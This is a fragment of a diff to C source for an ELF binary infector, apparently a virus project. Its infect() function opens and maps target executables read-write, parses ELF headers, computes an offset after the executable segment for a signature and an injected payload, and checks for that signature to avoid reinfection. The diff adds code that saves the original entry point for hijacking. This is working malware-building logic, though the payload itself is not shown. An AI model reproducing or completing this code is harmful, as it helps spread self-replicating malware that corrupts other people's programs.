@@ -34,16 +34,19 @@ bool	infect(const str path) {
 	open(fd, path, O_RDWR);
 
 	fstat(ret, fd, &file_stat);
-	if (ret)
+	if (ret) {
 		printf(FILE_LINE("fstat failed: %ld\n"), ret);
+	}
+
 
 	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
 		goto infect_end;
 
 	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	close(fd);
-	if (file_origin == MAP_FAILED)
+	if (file_origin == MAP_FAILED) {
 		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
+	}
 
 	// Logic starts
 	if (parsing(file_origin, file_stat, &data) == false)
@@ -90,6 +93,7 @@ static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
 	data->signature_offset = off_end_exec_segment(data);
 	data->infection_offset = data->signature_offset + SIGNATURE_LEN;
+	data->original_entry_point = data->elf->e_entry;
 
 	if (ft_memcmp((const byte *)SIGNATURE, file + data->signature_offset, SIGNATURE_LEN) == true)
 		return false;
